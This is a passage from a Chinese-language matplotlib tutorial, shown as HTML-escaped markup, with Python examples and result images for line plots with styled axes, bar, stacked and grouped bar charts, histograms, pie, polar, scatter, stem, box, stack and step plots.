&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import numpy as np
import matplotlib.pyplot as plt

# np.linspace将会在-5到5的区间内生成100个数，注意这个是均匀分布的
x = np.linspace(-5, 5, 100)

# 根据x的值，经过计算生成y1和y2的值
y1 = 2 * x + 1
y2 = x ** 2

# font = {&quot;family&quot; : &quot;SimHei&quot;,
#  &quot;size&quot; : &quot;20&quot;}
# plt.rc(&quot;font&quot;, **font)
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

# 设置画布大小
plt.figure(figsize=(8, 5))

# 画图
plt.plot(x, y1)
plt.plot(x, y2, color='red', linewidth=1.0, linestyle='--')

# 设置坐标轴范围
plt.xlim((-3, 5))
plt.ylim((-4, 5))

# 设置坐标轴名称
plt.xlabel('我是x轴')
plt.ylabel('我是y轴')

# 设置坐标轴的刻度
plt.xticks(np.linspace(-1, 2, 5))
plt.yticks([-2, -1.8, -1, 1.22, 3], [&quot;北京&quot;, &quot;天津&quot;, &quot;河北&quot;, &quot;东北&quot;, &quot;山东&quot;])

# 添加边框
ax = plt.gca()
# 修改右侧颜色
ax.spines[&quot;right&quot;].set_color(&quot;none&quot;)
# 修改左侧颜色
ax.spines[&quot;left&quot;].set_color(&quot;orange&quot;)
# 修改顶部颜色
ax.spines[&quot;top&quot;].set_color(&quot;none&quot;)
# 修改底部颜色
ax.spines[&quot;bottom&quot;].set_color(&quot;purple&quot;)

# 设置x轴的位置
ax.xaxis.set_ticks_position(&quot;bottom&quot;)
ax.spines[&quot;bottom&quot;].set_position((&quot;data&quot;, 0))
# 设置y轴的位置
ax.yaxis.set_ticks_position(&quot;left&quot;)
ax.spines[&quot;left&quot;].set_position((&quot;data&quot;, 0))

# 显示
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样就大功告成了，最后再来看一下现实的图形&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1600796346205-12eb4d1e-6b38-44b1-a332-e8e5ca35dc14.png#align=left&amp;amp;display=inline&amp;amp;height=444&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=888&amp;amp;originWidth=1436&amp;amp;size=85762&amp;amp;status=done&amp;amp;style=none&amp;amp;width=718&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;最后在画图时我们可以使用label参数给图片添加一个图例说明，最后使用legend显示出来，最终代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import numpy as np
import matplotlib.pyplot as plt

# np.linspace将会在-5到5的区间内生成100个数，注意这个是均匀分布的
x = np.linspace(-5, 5, 100)

# 根据x的值，经过计算生成y1和y2的值
y1 = 2 * x + 1
y2 = x ** 2

# font = {&quot;family&quot; : &quot;SimHei&quot;,
#  &quot;size&quot; : &quot;20&quot;}
# plt.rc(&quot;font&quot;, **font)
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

# 设置画布大小
plt.figure(figsize=(8, 5))

# 画图
plt.plot(x, y1, label='y1图例说明')
plt.plot(x, y2, color='red', linewidth=1.0, linestyle='--', label='y2图例说明')

# 设置坐标轴范围
plt.xlim((-3, 5))
plt.ylim((-4, 5))

# 设置坐标轴名称
plt.xlabel('我是x轴')
plt.ylabel('我是y轴')

# 设置坐标轴的刻度
plt.xticks(np.linspace(-1, 2, 5))
plt.yticks([-2, -1.8, -1, 1.22, 3], [&quot;北京&quot;, &quot;天津&quot;, &quot;河北&quot;, &quot;东北&quot;, &quot;山东&quot;])

# 添加边框
ax = plt.gca()
# 修改右侧颜色
ax.spines[&quot;right&quot;].set_color(&quot;none&quot;)
# 修改左侧颜色
ax.spines[&quot;left&quot;].set_color(&quot;orange&quot;)
# 修改顶部颜色
ax.spines[&quot;top&quot;].set_color(&quot;none&quot;)
# 修改底部颜色
ax.spines[&quot;bottom&quot;].set_color(&quot;purple&quot;)

# 设置x轴的位置
ax.xaxis.set_ticks_position(&quot;bottom&quot;)
ax.spines[&quot;bottom&quot;].set_position((&quot;data&quot;, 0))
# 设置y轴的位置
ax.yaxis.set_ticks_position(&quot;left&quot;)
ax.spines[&quot;left&quot;].set_position((&quot;data&quot;, 0))

# fontdict 是对字体大小和颜色进行设置，如果这里会对原图有遮挡，我们可以重新设置画布大小
plt.text(1, -1, &quot;这是我对图片添加的一段说明&quot;, fontdict={&quot;size&quot;: 12, &quot;color&quot;: &quot;r&quot;})

# 显示
plt.legend(loc='lower right')  # 图例说明没有参数则默认在右上角
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;二-绘制统计图形&quot;&gt;二 绘制统计图形&lt;/h3&gt;
&lt;h4 id=&quot;1-柱状图&quot;&gt;1 柱状图&lt;/h4&gt;
&lt;p&gt;在实际的企业应用中，我们要掌握多种图形的绘制，并且深度结合自己的应用场景，用合适的图形来展示适合它的数据场景，使得数据更具有说明力。&lt;/p&gt;&lt;p&gt;首先我们来学习一下bar()函数，它的功能是在x轴上绘制定性数据的分布特征，也就是柱状图。使用方法是plt.bar(x,y)，其中x表示在x轴上的定性数据的类别，而y表示每种定性数据的类别的数量。如果你觉得有点抽象，那我们就直接上代码吧。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt

# x是刻度，y是高度
x = [1, 2, 3, 4, 5, 6, 7, 8]
y = [3, 1, 4, 5, 7, 8, 6, 4]

plt.bar(x, y)

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;代码非常简单，分别定义好了x和y并且带入函数里面就可以了，它的现实结果其实就是一个条形图。&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601013958480-f095a7e1-bbed-4b5a-a074-e868716494ab.png#align=left&amp;amp;display=inline&amp;amp;height=442&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=884&amp;amp;originWidth=1126&amp;amp;size=93930&amp;amp;status=done&amp;amp;style=none&amp;amp;width=563&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;2-频率分布直方图&quot;&gt;2 频率分布直方图&lt;/h4&gt;
&lt;p&gt;与条形图相对比的是频率直方图（frequency histogram），也叫做频率分布直方图，是统计学中表示频率分布的图形。在直角坐标系中，用横轴表示随机变量的取值，横轴上的每个小区间对应一个组的组距，作为小矩形的底边；纵轴表示频率(频数/组距=频率)，并用它作小矩形的高，以这种小矩形构成的一组图称为频率直方图。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

x = np.random.randint(0, 10, 20)
print(x)

plt.hist(x)
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;随机x输出结果：[9 7 4 1 0 9 8 3 7 8 1 1 7 4 6 8 0 6 9 9]&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601014242791-58340cca-3701-4407-ac41-31d7013ec1f9.png#align=left&amp;amp;display=inline&amp;amp;height=437&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=874&amp;amp;originWidth=1154&amp;amp;size=84380&amp;amp;status=done&amp;amp;style=none&amp;amp;width=577&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;3-饼图&quot;&gt;3 饼图&lt;/h4&gt;
&lt;p&gt;下面要学习的就是饼图，饼图是一种用来表示数据所占比例最常用的图形，它的函数是pie()，使用方法也非常的简单，我们进行最简单的图形调用的时候也可以只传一个参数，就像这样plt.pie(x)。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt

# 中文显示
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

# 声明类别
kinds = ['苹果', '香蕉', '西红柿', '西瓜']

# 这个是16进制颜色码，你可以在网上搜索16进制颜色码就可以获取到所有的编码
colors = ['#e41a1c', '#DDA0DD', '#4B0082', '#7FFFAA']

sold_nums = [4, 3, 2, 5]

# 绘制饼图,根据图形效果，看一下这些参数的含义吧
plt.pie(sold_nums,
        labels=kinds,
        colors=colors)

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;饼图显示结果&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601014498855-76923409-2339-4dc0-b024-ca9ece625f03.png#align=left&amp;amp;display=inline&amp;amp;height=375&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=750&amp;amp;originWidth=1078&amp;amp;size=96562&amp;amp;status=done&amp;amp;style=none&amp;amp;width=539&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;4-极线图&quot;&gt;4 极线图&lt;/h4&gt;
&lt;p&gt;接下来我们看一下极线图的绘制方法，我们可以使用plt.polar(theta,x)这样的方式来进行图形的绘制，如果你之前没接触过这种图形，解释起来有一点复杂，我们直接来看一下效果吧。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

bar_slices = 10  # 星星数量
theta = np.linspace(0.0, 2*np.pi, bar_slices, endpoint=False)
r = 30*np.random.rand(bar_slices)
print(r)

# linewidth为线条粗细，mfc为星星颜色，ms为星星大小
plt.polar(theta, r, color='chartreuse', linewidth=2, marker='*', mfc='y', ms=10)
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;r输出结果为：[19.19557439  9.80163298 14.72266501 25.96471826 17.43950265 27.16974937&lt;br/&gt;24.16166493  8.32586511  1.07374567 21.5498875 ]&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601015666302-59cc102b-829f-4c14-ae2b-1e452fc0b8c2.png#align=left&amp;amp;display=inline&amp;amp;height=459&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=918&amp;amp;originWidth=1122&amp;amp;size=151877&amp;amp;status=done&amp;amp;style=none&amp;amp;width=561&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;5-散点图&quot;&gt;5 散点图&lt;/h4&gt;
&lt;p&gt;接下来要学习的图形叫做散点图，也有叫做气泡图的。我们可以使用plt.scatter(x,y)这样的方式来进行图形的绘制。关于scatter的参数：&lt;br/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;x就表示x轴上的值&lt;/li&gt;
&lt;li&gt;y就表示y轴上的值&lt;/li&gt;
&lt;li&gt;s表示散点标记的大小，这个是可选项&lt;/li&gt;
&lt;li&gt;c表示散点标记的颜色，可选项&lt;/li&gt;
&lt;li&gt;cmap表示将浮点数映射成颜色的颜色映射表&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;br/&gt;让我们通过一段代码的演示，来看看实践一下这些参数。自己可以根据我的说明尝试着修改一下这些参数。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np
import matplotlib as mpl

a = np.random.randn(100)
b = np.random.randn(100)

&quot;&quot;&quot;
cmap的参数非常多，cm后面的gist_rainbow可以有很多替代
具体的可以在官网或者源代码中查询使用，不过都把差别不大，就是颜色上的区别
&quot;&quot;&quot;
plt.scatter(a, b, s=np.power(10*a+20*b, 2),
            c=np.random.rand(100),
            cmap=mpl.cm.gist_rainbow,
            marker='o')  # marker表示散点的样式，可以试试用o,*或者^

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;展示结果如图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601018493431-d321585c-fe39-405b-a03d-a72d504e7d23.png#align=left&amp;amp;display=inline&amp;amp;height=439&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=878&amp;amp;originWidth=1150&amp;amp;size=190222&amp;amp;status=done&amp;amp;style=none&amp;amp;width=575&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;6-棉棒图&quot;&gt;6 棉棒图&lt;/h4&gt;
&lt;p&gt;下面我们来讲解一下棉棒图的绘制方法，棉棒图主要用来绘制离散有序的数据，使用方法是plt.stem(x,y)。关于它的参数有：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;x:用来指定棉棒的x轴基线上的位置。&lt;/li&gt;
&lt;li&gt;y:棉棒的长度。&lt;/li&gt;
&lt;li&gt;linefmt:棉棒的样式。&lt;/li&gt;
&lt;li&gt;markerfmt:棉棒末端的样式。&lt;/li&gt;
&lt;li&gt;basefmt:指定基线的样式。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;我们直接上代码来看一下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

# linspace：在0.5和2*np.pi之间返回20个均匀间隔的数据
x = np.linspace(0.5, 2 * np.pi, 20)
# randn：返回20个服从标准正态分布的样本数据
y = np.random.randn(20)

# --是虚线，-是实线
plt.stem(x, y, linefmt='--', markerfmt='o', basefmt='-')
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;显示结果如下图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601237464942-a3b5ed7b-e8c3-4410-bdc0-7406805415e2.png#align=left&amp;amp;display=inline&amp;amp;height=438&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=876&amp;amp;originWidth=1142&amp;amp;size=77952&amp;amp;status=done&amp;amp;style=none&amp;amp;width=571&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;7-箱线图&quot;&gt;7 箱线图&lt;/h4&gt;
&lt;p&gt;接下来我们来绘制一下箱线图，箱线图的绘制方法也比较简单，我们使用plt.boxplot(x)来实现，x就是我们要输入的数据了。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

x = np.random.randn(1000)
plt.boxplot(x)
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;显示结果如下图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601237656858-449654fe-8454-45fa-af0b-7e219ed6bab5.png#align=left&amp;amp;display=inline&amp;amp;height=422&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=844&amp;amp;originWidth=1124&amp;amp;size=37558&amp;amp;status=done&amp;amp;style=none&amp;amp;width=562&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;三-图形参数说明&quot;&gt;三 图形参数说明&lt;/h3&gt;
&lt;h4 id=&quot;1-柱状图参数详解&quot;&gt;1 柱状图参数详解&lt;/h4&gt;
&lt;p&gt;我们再次来看一下柱状图，柱状图在数据的可视化展示用应用的场景非常的多了，比如按照月份的商品销量展示，销售人员的业绩统计等等场景我们都会用到。现在我在原有代码基础之上加入一些新的参数，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt

x = [1, 2, 3, 4, 5]
y = [6, 10, 4, 5, 1]

# 中文显示
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

plt.bar(
    # 1 柱体的标签值
    x,
    # 2 柱体的高度
    y,
    # 3 柱体的对齐方式，两个参数：edge或者center
    align='edge',
    # 4 颜色
    color='b',
    # 5 刻度的标签值，用字母把x中的数字替换
    tick_label=['A', 'B', 'C', 'D', 'E'],
    # 6 透明度
    alpha=0.5
)

plt.xlabel('产品代号')
plt.ylabel('产品销量')

# 网格设置
plt.grid(
    True,
    # 1 axis指的是对轴的设置，参数可以为x，y或者both
    axis='x',
    # 2 ls指的是网格的样式，也可以写成--或者:
    ls=':',
    color='r',
    alpha=0.9
)

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;显示结果如下图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601239204401-7bfbba14-06d2-4a4e-a085-02c844ff1841.png#align=left&amp;amp;display=inline&amp;amp;height=451&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=902&amp;amp;originWidth=1164&amp;amp;size=136551&amp;amp;status=done&amp;amp;style=none&amp;amp;width=582&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;2-条形图参数详解&quot;&gt;2 条形图参数详解&lt;/h4&gt;
&lt;p&gt;条形图其实就是把柱状图横过来放，它们的使用方法一样，只是调用的函数不同，参数全部相同，具体代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt

x = [1, 2, 3, 4, 5]
y = [6, 10, 4, 5, 1]

# 中文显示
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

# 函数改为了barh，只是添加了一个h，代表horizontal水平横放
plt.barh(
    # 1 柱体的标签值
    x,
    # 2 柱体的高度
    y,
    # 3 柱体的对齐方式，两个参数：edge或者center
    align='edge',
    # 4 颜色
    color='b',
    # 5 刻度的标签值，用字母把x中的数字替换
    tick_label=['A', 'B', 'C', 'D', 'E'],
    # 6 透明度
    alpha=0.5
)

plt.xlabel('产品代号')
plt.ylabel('产品销量')

# 网格设置
plt.grid(
    True,
    # 1 axis指的是对轴的设置，参数可以为x，y或者both
    axis='x',
    # 2 ls指的是网格的样式，也可以写成--或者:
    ls=':',
    color='r',
    alpha=0.9
)

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;显示结果如下图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601239484351-8a4d066b-8f52-47a4-bda9-cbcfa8eae748.png#align=left&amp;amp;display=inline&amp;amp;height=451&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=902&amp;amp;originWidth=1166&amp;amp;size=111098&amp;amp;status=done&amp;amp;style=none&amp;amp;width=583&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;3-堆积图参数详解&quot;&gt;3 堆积图参数详解&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt

x = [1, 2, 3, 4, 5]
y = [6, 10, 4, 5, 1]
y1 = [2, 6, 3, 4, 5]

# 中文显示
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

plt.figure(figsize=(8, 5))
plt.bar(
    x,
    y,
    align='center',
    color='#66c2a5',
    tick_label=['A', 'B', 'C', 'D', 'E'],
    label='男人'
)
plt.bar(
    x,
    y1,
    align='center',
    bottom=y,  # 指定哪一值在下面
    color='#8da0cb',
    label='女人'
)
plt.xlabel('城市代号')
plt.ylabel('男女比例')

plt.legend()
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;显示结果如下图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601240532785-092e2c8a-e7a2-47a4-ac82-f7686b5952e3.png#align=left&amp;amp;display=inline&amp;amp;height=462&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=924&amp;amp;originWidth=1418&amp;amp;size=116986&amp;amp;status=done&amp;amp;style=none&amp;amp;width=709&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;4-堆积条形图参数详解&quot;&gt;4 堆积条形图参数详解&lt;/h4&gt;
&lt;p&gt;同理，堆积条形图就是把堆积图横放，原来需要考虑底部的是哪一个值，现在需要思考的是左边的是哪一个值，具体代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt

x = [1, 2, 3, 4, 5]
y = [6, 10, 4, 5, 1]
y1 = [2, 6, 3, 4, 5]

# 中文显示
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

plt.figure(figsize=(8, 5))
plt.barh(x, y, align='center', color='#66c2a5', tick_label=['A', 'B', 'C', 'D', 'E'], label='男人')

# 这里修改了left 指定哪个值在这个图的下边
plt.barh(x, y1, align='center', left=y, color='#8da0cb', label='女人')

plt.xlabel('城市代号')
plt.ylabel('男女比例')

plt.legend()
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;显示结果如下图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601240938737-80f8e54c-9457-4daf-989f-91e48f27509f.png#align=left&amp;amp;display=inline&amp;amp;height=460&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=920&amp;amp;originWidth=1392&amp;amp;size=105068&amp;amp;status=done&amp;amp;style=none&amp;amp;width=696&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;5-分块图参数详解&quot;&gt;5 分块图参数详解&lt;/h4&gt;
&lt;p&gt;堆积图可以展示多数据形式上的差异，但有时不是特别明显，这是用分块图就可以很直观的比较出来。分块图可以分为多数据并列柱状图和多数据并列条形图，我们先来一起看一下多数据并列柱状图，具体代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

# 中文显示
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

x = np.arange(5)
y = [6, 10, 4, 5, 1]
y1 = [2, 6, 3, 8, 5]

bar_width = 0.35
tick_label = ['A', 'B', 'C', 'D', 'E']
plt.figure(figsize=(8, 5))

plt.bar(
    x,
    y,
    bar_width,
    color='c',
    align='center',
    label='男人',
    alpha=0.5
)

plt.bar(
    x+bar_width,
    y1,
    bar_width,
    color='b',
    align='center',
    label='女人',
    alpha=0.3
)

plt.xlabel('城市代号')
plt.ylabel('男女比例')

plt.xticks(x+bar_width/2, tick_label)

plt.legend()
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;图形显示结果如下图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601242120862-fcdf766e-1298-40d9-ba65-1f782b9806a5.png#align=left&amp;amp;display=inline&amp;amp;height=475&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=950&amp;amp;originWidth=1436&amp;amp;size=110082&amp;amp;status=done&amp;amp;style=none&amp;amp;width=718&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;6-多数据并列条形图详解&quot;&gt;6 多数据并列条形图详解&lt;/h4&gt;
&lt;p&gt;根据我们的前面的讲解，你应该已经知道了，我们只需要把函数bar改为barh就可以，代码如下所示：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

# 中文显示
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

x = np.arange(5)
y = [6, 10, 4, 5, 1]
y1 = [2, 6, 3, 8, 5]

bar_width = 0.35
tick_label = ['A', 'B', 'C', 'D', 'E']
plt.figure(figsize=(8, 5))

plt.barh(
    x,
    y,
    bar_width,
    color='c',
    align='center',
    label='男人',
    alpha=0.5,
    hatch='\/'  # 如果我们需要添加一些装饰线可以使用hatch参数
)

plt.barh(
    x+bar_width,
    y1,
    bar_width,
    color='b',
    align='center',
    label='女人',
    alpha=0.3,
    hatch='\\'  
)

plt.xlabel('城市代号')
plt.ylabel('男女比例')

plt.xticks(x+bar_width/2, tick_label)

plt.legend()
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;图形显示结果如下图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601243145929-4d39f050-08c5-431f-9c97-d0547f0f632e.png#align=left&amp;amp;display=inline&amp;amp;height=467&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=934&amp;amp;originWidth=1404&amp;amp;size=135011&amp;amp;status=done&amp;amp;style=none&amp;amp;width=702&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;7-堆积折线图参数详解&quot;&gt;7 堆积折线图参数详解&lt;/h4&gt;
&lt;p&gt;堆积折线图是通过绘制不同数据集的折线图而生成的，按照垂直方向上彼此堆叠且又不互相覆盖的排列顺序，绘制若干条折线图而形成的组合图形。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

x = np.arange(1, 6, 1)
y = [0, 4, 3, 5, 6]
y1 = [1, 3, 4, 2, 7]
y2 = [3, 4, 1, 6, 5]

labels = ['2018', '2019', '2020']
colors = ['r', 'b', 'y']

plt.stackplot(x, y, y1, y2, labels=labels, colors=colors)

plt.legend()
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;图形显示结果如下图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601243881281-acc457e0-db58-4d77-ac98-f44e91770862.png#align=left&amp;amp;display=inline&amp;amp;height=444&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=888&amp;amp;originWidth=1170&amp;amp;size=127677&amp;amp;status=done&amp;amp;style=none&amp;amp;width=585&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;8-间断条形图参数详解&quot;&gt;8 间断条形图参数详解&lt;/h4&gt;
&lt;p&gt;间断条形图是在条形图的基础之上绘制而成的，主要用来可视化定性数据的相同指标在时间维度上的指标值的变化情况，直观比较并展现出定性数据的相同指标的变化情况。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

# 中文显示
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

plt.broken_barh(
    # 元组中第一个元素代表距离y轴的距离，第二个元素代表自身的宽度
    [(10, 20), (190, 60), (270, 80), (370, 80)],
    # 元组中第一个元素代表距离x轴的距离，第二个元素代表自身的长度
    (30, 9),
    facecolors='r'
)

plt.broken_barh(
    [(30, 80), (190, 60), (270, 80), (360, 30)],
    (10, 5),
    facecolors=('b', 'y', 'g', 'purple')
)

# 定义坐标轴的范围
plt.xlim(0, 500)
plt.ylim(5, 50)

# 定义x轴的名称
plt.xlabel('上课时间')

# 定义x轴的刻度
plt.xticks(np.arange(0, 361, 60))

# 定义y轴的刻度和名称
plt.yticks([15, 25], ['一班', '二班'])

# 定义刻度的样式
plt.grid(ls='--', lw=1, color='gray')

# 定义主题名称
plt.title('两个班级的上课时间')

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;图形显示结果如下图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601246420302-6d3cbe3c-2f5d-4a98-87c4-eb4f5759e327.png#align=left&amp;amp;display=inline&amp;amp;height=456&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=912&amp;amp;originWidth=1150&amp;amp;size=100390&amp;amp;status=done&amp;amp;style=none&amp;amp;width=575&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;9-阶梯图参数详解&quot;&gt;9 阶梯图参数详解&lt;/h4&gt;
&lt;p&gt;阶梯图就如其名字那样，像一台阶一样，时而上升，时而下降，我们经常用它来展示数据的趋势变化或周期顾虑。阶梯图经常使用在时间序列的数据的可视化任务中，比如商品的日销量、月销量，企业中每月的员工数量的变化等，这样我们能够很容易发现时序数据的波动周期和规律。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

x = np.linspace(1, 10, 10)
print(x)
y = np.sin(x)
print(y)

# 代码1
plt.step(x, y, color='b', where='pre', lw=2)
plt.xlim(0, 12)
plt.ylim(-1.2, 1.2)
plt.xticks(np.arange(1, 13, 1))
plt.grid(ls='--', lw=1, color='gray')
plt.show()

# 代码2 
plt.step(x, y, color='b', where='mid', lw=2)
plt.xlim(0, 12)
plt.ylim(-1.2, 1.2)
plt.xticks(np.arange(1, 13, 1))
plt.grid(ls='--', lw=1, color='gray')
plt.show()

# 代码3
plt.step(x, y, color='b', where='post', lw=2)
plt.xlim(0, 12)
plt.ylim(-1.2, 1.2)
plt.xticks(np.arange(1, 13, 1))
plt.grid(ls='--', lw=1, color='gray')
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
